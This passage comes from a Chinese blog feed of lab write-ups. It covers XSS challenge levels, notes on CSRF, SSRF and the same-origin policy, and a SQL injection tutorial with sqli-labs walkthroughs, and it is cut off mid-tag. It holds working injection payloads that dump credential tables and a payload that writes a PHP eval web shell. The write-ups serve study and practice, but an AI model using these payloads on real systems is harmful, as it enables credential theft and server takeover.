上一个连接跳转的地址，所以我们直接抓包把referer里绕过，23&amp;t_sort=”type=”text” onclick=”alert(1)</p><p>在第十关完成的瞬间，我们使用burp抓取数据包<br>然后修改referer这一栏的为我们的payload，payload可以与第十关的相同，可以发现顺利进入了第十一关，并且也有弹出一个输入的text格式框<br>此时只要点击一下那个text输入框，我们就能顺利通关！</p><p><strong>12.关</strong>（改User-Agent）<br>我们按照上一次11关的过关实验方法，修改 user-agent 来试试xss，发现同样的方法也是OK的，即：在11关过关的时候抓包，修改我们的User-Agent头，然后直接在burp里改为如下payload即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=123&amp;t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><strong>13.关</strong>（改cookie）</p><p>通过第11、12关的经验，我们已经成功地破解了其中的奥义，就是根据代码从各个地方注入xss语句，现在继续观察一下第13关的代码<br>在第12关快通过时抓包，修改增加一个cookie，并添加内容为user=payload即可!<br>放行数据包，顺利通关</p><p><strong>14.关</strong> 加载异常</p><p><strong>15.关</strong>（文件包含）</p><p>发现没有什么表单可以利用了，但是有一个<code>&lt;img&gt;</code>标签可以利用</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss%E7%AC%AC%E5%8D%81%E4%BA%94%E5%85%B3.png"></p><p>使用 <code>&lt;img src=1 onerror=alert (1)&gt;</code>  ,意思先执行 1 位置的东西，如果有错误就输出后面的东西，就是一个报错语句。但是src后面要接地址才是正确的语法，所以它一定会报错，所以就会执行我们的恶意代码</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss15.png"></p><p><strong>16.关</strong></p><p>同十五关</p><p>或者</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/xss16.png"></p><p>但是在HTML中可以将%0a或者%0D当成空格使用所以我们直接在URL后面接 <code>&lt;a%0Ahref=&#39;javas%0Acript:alert(&quot;xss&quot;)&#39;&gt;</code></p><p><strong>17.关</strong>：flash有问题18，19，20</p><p>​       </p><h2 id="题外话小插曲"><a href="#题外话小插曲" class="headerlink" title="题外话小插曲"></a>题外话小插曲</h2><h3 id="CSRF-漏洞"><a href="#CSRF-漏洞" class="headerlink" title="CSRF 漏洞"></a>CSRF 漏洞</h3><p><strong>1.简介：</strong>跨站请求伪造，攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全</p><p>　发生条件：<br>　   1、登录受信任网站A，并在本地生成Cookie。<br>　   2、在不登出A的情况下，访问危险网站B。</p><h3 id="SSRF-漏洞"><a href="#SSRF-漏洞" class="headerlink" title="SSRF 漏洞"></a>SSRF 漏洞</h3><p><strong>1.简介：</strong>服务器端请求伪造，由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）<br>     危害：<br>　　1、可对内网，服务器所在内网，受控服务器进行端口扫描，获取一些banner<br>　　2、对内网web应用进行指纹识别，通过访问默认文件实现。<br>　　3、攻击内外网web应用，主要是使用get参数就可以实现分攻击。<br>　　4、利用file协议读取本地文件。</p><h3 id="CSRF与SSRF的区别"><a href="#CSRF与SSRF的区别" class="headerlink" title="CSRF与SSRF的区别"></a>CSRF与SSRF的区别</h3><p>CSRF 是客户端发送的请求，SSRF 是服务器端向另一个服务器发送的请求</p><h3 id="SOP同源策略"><a href="#SOP同源策略" class="headerlink" title="SOP同源策略"></a>SOP同源策略</h3><p>几个页面的协议、主机名、端口相同，那么就认为这些页面是同源的。</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/%E5%9B%BE%E7%89%871.png"></p><p>如果非同源，共有三种行为受到限制</p><p>1、限制 cookies、DOM 和 Javascript 的命名区域限制 </p><p>2、iframe、图片等各种资源的内容操作限制 </p><p>3、ajax 请求，准确来说是限制操作 ajax 响应结果，本质上跟上一条是一样的</p><p>同源策略没有禁止脚本的执行，而是禁止读取 HTTP 回复。因此会发现，同源策略的作用其实很有限，它不能防护CSRF。因为CSRF（Cross-site request forgery）跨站请求伪造，是一种常见的攻击方式。是指 A 网站正常登陆后，cookie 正常保存，其他网站 B 通过某种方式调用 A 网站接口进行操作，A 的接口在请求时会自动带上 cookie。</p><p>上面说了，SOP 可以通过 html tag 加载资源，而且 SOP 不阻止接口请求而是拦截请求结果，CSRF 恰恰占了这两个便宜</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;XSS-漏洞&quot;&gt;&lt;a href=&quot;#XSS-漏洞&quot; class=&quot;headerlink&quot; title=&quot;XSS 漏洞&quot;&gt;&lt;/a&gt;XSS 漏洞&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.简介&lt;/strong&gt;：跨站脚本攻击，是指恶意攻击者往Web页面里插入恶意Script代</summary>
      
    
    
    
    <category term="XSS" scheme="https://www.mtrleed.top/categories/XSS/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://www.mtrleed.top/post/7/"/>
    <id>https://www.mtrleed.top/post/7/</id>
    <published>2021-08-06T16:00:00.000Z</published>
    <updated>2023-03-01T13:38:44.309Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>此文是基于MySQL数据库的学习记录</p><h2 id="认识sql注入"><a href="#认识sql注入" class="headerlink" title="认识sql注入"></a>认识sql注入</h2><ol><li>sql注入是一种web应用代码漏洞，在与数据库有交互的地方没有对用户的输入做好限制且没有对传入数据的进行过滤，通过构造特殊的请求，使web应用执行附加条件的sql语句以此返回想要的信息，实现对数据库的任意查询</li><li>常见sql注入的类型：</li></ol><blockquote><p>1.显错注入 </p><p>2.报错注入</p><p>3.布尔盲注</p><p>4.延时注入（基于时间的盲注）</p><p>5.http-header注入(User-Agent 和 Cookie)</p><p>6.堆叠注入</p><p>7.DNS_log注入</p></blockquote><p>3.sql注入的作用：</p><blockquote><p>1.绕过登陆验证</p><p>2.获取敏感信息</p><p>3.文件操作（读写，传马）</p><p>4.执行系统命令（UDF）</p></blockquote><h2 id="sql注入类型详解"><a href="#sql注入类型详解" class="headerlink" title="sql注入类型详解"></a>sql注入类型详解</h2><p>1.显错注入： 也称为联合注入，因为在显错注入里最常用的查询语句结构就是 union 联合查询。这种注入方式的前提是我们可以看到想要的回显，数据库的执行结果 <strong>直接显示</strong> 到页面上，常用的步骤：</p><blockquote><p>1.判断注入点是否存在**?id=1’ **报错就存在sql注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错</p><p>2.使用 <strong>order by</strong> 判断字段(“少准对 多错”)</p><p>3.使用 <strong>union select</strong> 联合查询查看显示位，注意：要保证union 前面的查询错误才会显示后面的查询， 例如: <strong>?id=-123 union select 1,2,3,4– -</strong></p><p>4.在显示位上使用查询 库、表、字段、字段内容 的sql语句</p></blockquote><p>2.报错注入： 前提是对方服务器开启了报错显示服务。利用报错服务获取数据库数据的操作就是报错注入，通常与 **union select **连用；一般步骤：</p><blockquote><p>1.判断是否存在注入点（同上）</p><p>2.故意构造报错语句，这里我们常用的3个函数 <strong>updatexml(XML_document, XPath_string, new_value)</strong>  、<strong>floor()</strong>  、<strong>extractvalue(XML_document，xpath_string)</strong> </p><p>例如：**?id=-1’ union select updatexml(1,concat(‘.’,(select group_concat(schema_name)from information_schema.schemata)),1);– -**</p><p>解释两个函数：</p><p>1.<strong>updatexml(XML_document, XPath_string, new_value)</strong>  用来更新XML文档，该函数有3个参数。 </p><p>第一个参数：是string格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：代表路径，Xpath格式的字符串例如    //title【@lang】 </p><p>第三个参数：string格式，替换查找到的符合条件的数据</p><p>updatexml使用时，1、3参数可以全写阿拉伯数字，不影响。主要使用的是第2参数的格式错误。当<strong>xpath_string</strong>格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）但是最多返回<strong>32位</strong></p><p>例如 爆库名 构造payload：**?id=-1’ union select updatexml(1,concat(‘~’,(select group_concat(schema_name)from information_schema.schemata)),1);– -**</p><p>2.<strong>extractvalue(XML_document，xpath_string)</strong>  此函数用来从目标XML中返回包含所查询值的字符串，有两个参数。</p><p>第一个参数：string格式，为XML文档对象的名称 </p><p>第二个参数：xpath_string（xpath格式的字符串）</p><p>extractvalue使用时，1参数可以写阿拉伯数字填充，不影响。当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）但是最多返回<strong>32位</strong></p><p><strong>?id=-1’ union select extractvalue(1,concat(‘~’,(select database())));– -</strong></p></blockquote><p>3.布尔盲注：当我们在注入时遇到有些网站没有输出点，且关闭了错误回显，这时我们可以考虑使用布尔盲注。盲注基本就是猜，费时费力。一般使用以下几个函数进行猜解。</p><blockquote><p>1.length()：函数的返回值为字符串的字节长度。</p><p>2.substr()：截取字符串，用法substr(string, start,length)</p><p>3.string-指定的要截取的字符串  start-规定在字符串的何处开始 length-指定要截取的字符串长度</p><p>4.ascii()：返回字符串中第一个字符的ascii值</p><p>使用演示：</p><h3 id="1-使用length-函数猜数据库名长度"><a href="#1-使用length-函数猜数据库名长度" class="headerlink" title="1.使用length()函数猜数据库名长度"></a>1.使用length()函数猜数据库名长度</h3><p>如length(database())&gt;10,页面显示正常</p><p>length(database())&gt;20,页面显示不正常</p><p>length(database())=9,页面显示正常</p><p>我们可以用二分法猜解得到数据库的长度</p><h3 id="2-利用ascii猜数据库名"><a href="#2-利用ascii猜数据库名" class="headerlink" title="2.利用ascii猜数据库名"></a>2.利用ascii猜数据库名</h3><p>and (ascii(substr(database(),1,1)))=100,如果页面返回正常，说明数据库名称第一位是d</p><h3 id="3-猜字段名"><a href="#3-猜字段名" class="headerlink" title="3.猜字段名"></a>3.猜字段名</h3><p>and (ascii(substr((select column_name from information_schema.columns where table_name=’aaa’ limit 0,1),1,1)))&gt;100</p></blockquote><p>4.延时注入(基于时间的盲注)：有时候我们会遇到一种情况，无论怎么操作页面都是返回正常，这时我们可以考虑用延时注入</p><blockquote><p>延时注入最常用的函数<strong>sleep()</strong></p><p>sleep()：执行挂起一段时间,也就是等待一段时间在继续执行</p><p>例：select * from users where id=1 and sleep(5);  /* 5秒之后执行SQL语句*/</p><p>if(expr1,expr2,expr3)：expr1为0或者null或者false，则返回 expr3 ; 否则，返回expr2。</p><p>构造语句：and if(ascii(substr(database(),1,1))=100,0,sleep(10))</p><p>如果库名第一个字符是d，则网页延时10秒</p></blockquote><p>5.http-header注入：通过构造 HTTP请求头来达到爆出数据库内容的方式。HTTP请求头内容很多，我们通常修改以下两个参数 <strong>User-Agent</strong>  和 <strong>Cookie</strong> (在使用之前要将请求头发送到 repeater 模块,才能修改)</p><blockquote><p>（User-Agent）一般步骤：</p><p>1.抓包，将包发送到repeater模块</p><p>2.将User-Agent删掉，自己构造一个 ，还是按照之前的思路，先输入一个单引号，然后放包，若页面显示报错，接下来的步骤就很简单了，制作一个能用的payload。比如:  <strong>User-Agent: 666’ or updatexml (1,concat (0x7e,database()),0) or ‘</strong></p><p>3.持续构造payload 查看不同数据</p><p>(Cookie) 一般步骤 ：</p><p>1.抓包，将包发送到<strong>repeater</strong>模块</p><p>2.例如我们现在账号后面加一个逗号，放包，若是页面显示错误，存在sql注入</p><p>3.构造payload ，将cookie 构造成 例如 <strong>Cookie: ant[uname]=admin’ and updatexml (1, concat (Ox7e, database()),0) or ‘;</strong></p></blockquote><p>6.堆叠注入: 就是同时执行两条以上的sql语句</p><blockquote><p>例如： <strong>‘;select * from admins;show database()</strong></p></blockquote><p>7.DNS_log注入：属于sql 注入的一种(oob在sql中的应用)  oob：数据外带。前提条件： secure_file_priv = “ ” 否则不行， 任意文件读取。</p><p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/1545399-20190329195347336-890312924.png">        </p><p><strong>效果</strong>：将盲注，时间注入 变成显错(联合)注入</p><p><strong>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息</strong><br><strong>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</strong></p><p><strong>利用场景:</strong></p><p>在sql注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的DNS_log注入。</p><h2 id="sqli-靶场"><a href="#sqli-靶场" class="headerlink" title="sqli 靶场"></a>sqli 靶场</h2><h3 id="1关：’-闭合-显错报错"><a href="#1关：’-闭合-显错报错" class="headerlink" title="1关：’ 闭合 显错报错"></a><strong>1关：’ 闭合 显错报错</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3-- - //查显示位</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span><span class="comment">-- - //查全库</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;),3-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>),<span class="number">3</span><span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e)) from users),3-- - //查数据</span></span><br></pre></td></tr></table></figure><h3 id="2关：数字型注入-显错注入"><a href="#2关：数字型注入-显错注入" class="headerlink" title="2关：数字型注入  显错注入"></a><strong>2关：数字型注入  显错注入</strong></h3><p>payload 参考2关</p><h3 id="3关-‘-闭合-显错注入"><a href="#3关-‘-闭合-显错注入" class="headerlink" title="**3关: ‘) 闭合 显错注入 **"></a>**3关: ‘) 闭合 显错注入 **</h3><p>payload 参考2关</p><h3 id="4关：”-闭合-显错注入"><a href="#4关：”-闭合-显错注入" class="headerlink" title="4关：”) 闭合 显错注入"></a><strong>4关：”) 闭合 显错注入</strong></h3><p>payload 参考2关</p><h3 id="5关：’-闭合-报错注入"><a href="#5关：’-闭合-报错注入" class="headerlink" title="5关：’ 闭合 报错注入"></a><strong>5关：’ 闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select database())),1)-- -//查当前数据库</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">-- - //查全库（使用limit 控制）</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1)-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)) ,<span class="number">1</span>)<span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select concat(id,0x7e,username,0x3A,password,0x7e)from users limit 0,1)),1)-- -//查数据</span></span><br></pre></td></tr></table></figure><h3 id="6关：”-闭合-报错注入"><a href="#6关：”-闭合-报错注入" class="headerlink" title="6关：” 闭合 报错注入"></a><strong>6关：” 闭合 报错注入</strong></h3><p>payload 参考5关</p><h3 id="7关：-“-闭合-文件写入"><a href="#7关：-“-闭合-文件写入" class="headerlink" title="7关： “)) 闭合  文件写入"></a><strong>7关： “)) 闭合  文件写入</strong></h3><p>上传木马，使用蚁剑连接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union </span></span><br><span class="line"><span class="string">select 1,2,&#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);<span class="operator">&gt;</span><span class="string">&#x27; into outfile &quot;D:\\phpstudy_pro\\999.php&quot; -- -</span></span><br><span class="line"><span class="string">bug：因为?id=1，所以上传的文件中会显示第1个用户的账号和密码。若?id=2，则上传的文件中会显示第2个用户的账号和密码。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span>)) <span class="keyword">union</span> </span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&gt;&#x27;</span> <span class="keyword">into</span> outfile &quot;D:\\phpstudy_pro\\999.php&quot; <span class="comment">-- -</span></span><br><span class="line">则不会出现这种情况</span><br></pre></td></tr></table></figure><h3 id="8关：’-闭合-布尔盲注"><a href="#8关：’-闭合-布尔盲注" class="headerlink" title="8关：’ 闭合 布尔盲注"></a><strong>8关：’ 闭合 布尔盲注</strong></h3><h3 id="9关：’-闭合-时间盲注"><a href="#9关：’-闭合-时间盲注" class="headerlink" title="9关：’ 闭合 时间盲注"></a><strong>9关：’ 闭合 时间盲注</strong></h3><h3 id="10关：”-闭合-时间盲注"><a href="#10关：”-闭合-时间盲注" class="headerlink" title="10关：” 闭合 时间盲注"></a><strong>10关：” 闭合 时间盲注</strong></h3><h3 id="11关：’-闭合-显错注入"><a href="#11关：’-闭合-显错注入" class="headerlink" title="11关：’ 闭合 显错注入"></a><strong>11关：’ 闭合 显错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> 猜字段payload ：uname<span class="operator">=</span>admin<span class="string">&#x27; order by 2#&amp;passwd=admin&amp;submit=Submit</span></span><br><span class="line"><span class="string">显示位：uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit </span><br><span class="line">查数据库：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(schema_name) from information_schema.schemata)##&amp;passwd=1&amp;submit=Submit 或uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata#<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="operator">&amp;</span>submit<span class="operator">=</span>Submit</span><br><span class="line"></span><br><span class="line">查表：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查字段：uname=-admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>andtable_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit Submit</span><br><span class="line"></span><br><span class="line">字段内容：uname<span class="operator">=</span><span class="operator">-</span>admin<span class="string">&#x27; union select 1,(select group_concat(concat(id,0x7e,username,0x3A,password,0x7e))from users)##&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><h3 id="12关：”-闭合-显错注入，-同11关"><a href="#12关：”-闭合-显错注入，-同11关" class="headerlink" title="12关：”) 闭合 显错注入， 同11关"></a><strong>12关：”) 闭合 显错注入， 同11关</strong></h3><h3 id="13关：’-闭合-报错注入"><a href="#13关：’-闭合-报错注入" class="headerlink" title="13关：’) 闭合 报错注入"></a><strong>13关：’) 闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看当前数据库：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select database())),1)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看全部数据库：uname=admin&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> concat(schema_name)<span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span>,<span class="number">1</span>)),<span class="number">1</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit  <span class="operator">/</span><span class="operator">/</span>使用 limit控制输出内容 </span><br><span class="line"></span><br><span class="line">查看表：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1)##&amp;passwd=1&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查看字段：uname=admin&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;.&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)##<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>submit<span class="operator">=</span>Submit <span class="operator">/</span><span class="operator">/</span>使用 limit 控制输出</span><br><span class="line"></span><br><span class="line">查看字段内容：uname<span class="operator">=</span>admin<span class="string">&#x27;) union select 1,updatexml(1,concat(&#x27;</span>.<span class="string">&#x27;,(select concat(id,0x7e,username,0x3A,password,0x7e)from users limit 2,1)),1)##&amp;passwd=1&amp;submit=Submit  //使用 limit控制输出内容 </span></span><br></pre></td></tr></table></figure><h3 id="14关：”-闭合-报错注入，同13关"><a href="#14关：”-闭合-报错注入，同13关" class="headerlink" title="14关：” 闭合 报错注入，同13关"></a><strong>14关：” 闭合 报错注入，同13关</strong></h3><h3 id="15关：’-闭合-布尔盲注，延时注入"><a href="#15关：’-闭合-布尔盲注，延时注入" class="headerlink" title="**15关：’ 闭合 布尔盲注，延时注入 **"></a>**15关：’ 闭合 布尔盲注，延时注入 **</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">布尔盲注</span><br><span class="line">uname=&#x27; or (ascii(substr((select database()) ,1,1))) = 115 #&amp;passwd=&#x27; or 1=1 #&amp;submit=Submit //猜当前数据库的第一个字符为 S</span><br><span class="line"></span><br><span class="line">时间盲注：</span><br><span class="line">uname=1&#x27; and 1=2 union select 1,(length(database()儿)= 8 and if(1=1, sleep(5), 1)#&amp;passwd=1&amp;submit=Submit  //猜当前数据库的第一个字符为 S</span><br></pre></td></tr></table></figure><h3 id="16关：”-闭合-布尔盲注，延时注入-同15关"><a href="#16关：”-闭合-布尔盲注，延时注入-同15关" class="headerlink" title="16关：” 闭合 布尔盲注，延时注入 同15关"></a><strong>16关：” 闭合 布尔盲注，延时注入 同15关</strong></h3><h3 id="17关：’-闭合-报错注入-同13关"><a href="#17关：’-闭合-报错注入-同13关" class="headerlink" title="17关：’ 闭合 报错注入 同13关"></a><strong>17关：’ 闭合 报错注入 同13关</strong></h3><h3 id="18关：HTTP-头部注入-User-Agent"><a href="#18关：HTTP-头部注入-User-Agent" class="headerlink" title="18关：HTTP 头部注入  User-Agent"></a><strong>18关：HTTP 头部注入  User-Agent</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">代码审计，找到 <span class="keyword">insert</span>（插入数据的意思）</span><br><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;,&#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line"></span><br><span class="line">在<span class="keyword">User</span><span class="operator">-</span>Agent: 处注入</span><br><span class="line">猜想在数据中的<span class="keyword">sql</span>语句为：<span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">values</span>(<span class="string">&#x27;User-Agent&#x27;</span>,<span class="string">&#x27;Ip&#x27;</span>,<span class="string">&#x27;Username&#x27;</span>)</span><br><span class="line"></span><br><span class="line">接下来我们尝试在<span class="keyword">User</span><span class="operator">-</span>Agent的位置进行注入测试，我们修改<span class="keyword">User</span><span class="operator">-</span>Agnet的值使其符合整个 <span class="keyword">insert</span> <span class="keyword">into</span> 的语法，闭合后就应该为 <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span> ,<span class="number">1</span>,<span class="number">1</span>)#<span class="string">&#x27;,&#x27;</span>Ip<span class="string">&#x27;,&#x27;</span>Username<span class="string">&#x27;),成功绕过</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">18：源码片段$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;</span>$uagent<span class="string">&#x27;, &#x27;</span>$IP<span class="string">&#x27;, $uname)&quot;;//这里是三个值</span></span><br><span class="line"><span class="string">改为：User-Agent: &#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>) <span class="keyword">or</span> <span class="operator">/</span><span class="operator">/</span>这里是三个值</span><br><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent 的闭合原理思路还得研究</span><br><span class="line">或者：<span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),0) and&#x27;</span></span><br><span class="line">或者：<span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; and updatexml(1,concat(0x7e,(database()),0x7e),0),1,1)#  </span></span><br></pre></td></tr></table></figure><h3 